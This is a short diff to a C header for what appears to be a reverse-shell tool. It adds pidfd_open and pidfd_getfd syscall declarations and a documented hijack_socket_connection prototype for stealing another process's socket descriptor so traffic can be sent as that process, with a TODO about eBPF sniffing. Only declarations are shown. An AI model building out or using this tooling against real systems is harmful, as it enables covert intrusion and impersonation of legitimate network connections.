@@ -2,6 +2,9 @@
 #define REVERSE_SHELL_H 
 
 
+#define _GNU_SOURCE
+#include <sys/syscall.h>
+#include <fcntl.h>
 #include <stdio.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
@@ -46,6 +49,54 @@
 
 extern char **environ;
 
+
+
+/*
+ *
+ *  pidfd_open syscall => read the manual page on it
+ *
+ *
+ */
+
+
+
+int pidfd_open(pid_t pid, unsigned int flags);
+
+
+/*
+ *
+ *
+ *  pidfd_getfd syscall => read the manual page on it
+ *
+ *
+ */
+
+
+
+int pidfd_getfd(int pidfd, int targetfd, unsigned int flags);
+
+/*
+ *
+ *
+ *  hijack target fd descriptor from the process with process id of pid
+ *
+ *  on success the hijacked socket descriptor can be used to send and receive newtwork packets out as if the original process did
+ *
+ *  however note that receiving is destructive and other factors come into play
+ *
+ *  it would be better to use an ebpf program to sniff the received packets instead => TODO!
+ *
+ *  @param1 => target_pid
+ *  @param2 => target_fd
+ *
+ *  @return => bool
+ *  	true => success
+ *  	false => failure
+ *
+ */
+
+
+bool hijack_socket_connection(pid_t target_pid,int target_fd);
 
 
 /*
